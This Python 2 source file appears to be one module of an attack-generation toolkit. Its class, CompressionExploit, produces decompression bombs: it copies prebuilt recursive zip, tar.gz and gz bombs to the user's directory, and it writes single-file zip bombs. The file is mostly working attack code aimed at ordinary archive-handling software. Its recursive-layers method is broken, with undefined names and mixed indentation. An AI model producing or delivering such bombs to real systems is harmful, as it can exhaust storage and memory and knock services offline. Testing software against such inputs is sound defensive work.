from input import Generator
import zlib
import zipfile
import os
import sys
from shutil import copyfile


class CompressionExploit():

    options = dict({'algorithm': 'zip','type': 'recursive','input_budget' : 500 , 'target_size': 100000, 'output_file': 'output' })
    descriptions = dict({'algorithm' : "Compression algorithm for compression bomb" , 'type': "The type of compression bomb. Supported types are single_file, recursive_layers, and recursive.",'input_budget': "Number of bytes in input budget",'target_size': "Desired size of decompressed file. Not applicable to AC time exploits like recursive zip bombs.",  'output_file': 'Name of compressed file. Warning: Use at your own risk! Be careful!'})

    def run(self, generator):
        if self.options['algorithm']=='zip':
            if self.options['type'] =='recursive':
                if self.options['input_budget']>440:
                    copyfile(os.path.dirname(os.path.realpath(__file__)) +"/bombs-DONOTOPEN/zip_recursive.zip", self.options['output_file']+".zip")
                    print "Your zip bomb "+ self.options['output_file']+".zip is ready in your current directory."
                else:
                    print "We do not have a recursive zip bomb small enough."
            elif self.options['type']=='recursive_layers':  
                return # self.zipbomb(generator, int(self.options['input_budget']), int(self.options['target_size']),str(self.options['output_file'])))
            elif self.options['type']=='single_file': 
                self.zip_singlefilebomb(generator, int(self.options['input_budget']), int(self.options['target_size']),str(self.options['output_file']))
        if self.options['algorithm']=='tar.gz':
            if self.options['type'] =='recursive':
                if self.options['input_budget']>345:
                    copyfile(os.path.dirname(os.path.realpath(__file__)) +"/bombs-DONOTOPEN/tar_gz_recursive.tar.gz", self.options['output_file']+".tar.gz")
                    print "Your tar.gz bomb "+ self.options['output_file']+".tar.gz is ready in your current directory."
                else:
                    print "We do not have a recursive gz bomb small enough."
            elif self.options['type']=='single_file':
                print "Coming soon."
            elif self.options['type']=='recursive_layers':
                print "Coming soon."
        if self.options['algorithm']=='gz':
            if self.options['type'] =='recursive':
                if self.options['input_budget']>250:
                    copyfile(os.path.dirname(os.path.realpath(__file__)) +"/bombs-DONOTOPEN/gz_recursive.zip", self.options['output_file']+".gz") 
                    print "Your gz bomb "+ self.options['output_file']+".gz is ready in your current directory."        
                else:
                    print "We do not have a recursive gz bomb small enough."
            elif self.options['type']=='single_file':
                print "Coming soon."
            elif self.options['type']=='recursive_layers':
                print "Coming soon."

    def zipbomb(self, generator,input_budget, target_size, output_file):
        dummy_name=output_file+'.txt'
        out_zip_file= output_file +'.zip'
        self.generate_dummy_file(dummy_name,1)
        level_1_zip='1.zip'
        self.zip_compress_file(dummy_name,level_1_zip)
        os.remove(dummy_name)
        decompressed_size=1
        for i in xrange(1,n_levels+1):
		make_copies_and_compress('%d.zip'%i,'%d.zip'%(i+1),10)
		decompressed_size *= 10
		os.remove('%d.zip'%i)
	if os.path.isfile(out_zip_file):
		os.remove(out_zip_file)
        os.rename('%d.zip'%(n_levels+1),out_zip_file)
        print 'Compressed File Size: %.2f B'%(get_file_size(out_zip_file))
	print 'Size After Decompression: %d GB'%decompressed_size


    def zip_compress_file(self,infile,outfile):
	zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
	zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
	zf.close()
  
    def make_copies_and_compress(self,infile, outfile, n_copies):
	zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
	for i in xrange(n_copies):
		f_name = '%s-%d.%s' % (get_filename_without_extension(infile),i,get_extension(infile))
		shutil.copy(infile,f_name)
		zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
		os.remove(f_name)
	zf.close()
                                                                                                                                             
    def generate_dummy_file(self,filename,size):
        with open(filename,'w') as dummy:
	    dummy.write((size*'0'))  
  
    def zip_singlefilebomb(self, generator, input_budget, target_size, output_file):
        output_zip_file=output_file+".zip"
        self.generate_dummy_file("dummy.txt",target_size)
        self.zip_compress_file("dummy.txt",output_zip_file)
        os.remove("dummy.txt")
        print 'Zipped file size: %.2f B' % (os.stat(output_zip_file).st_size)                 

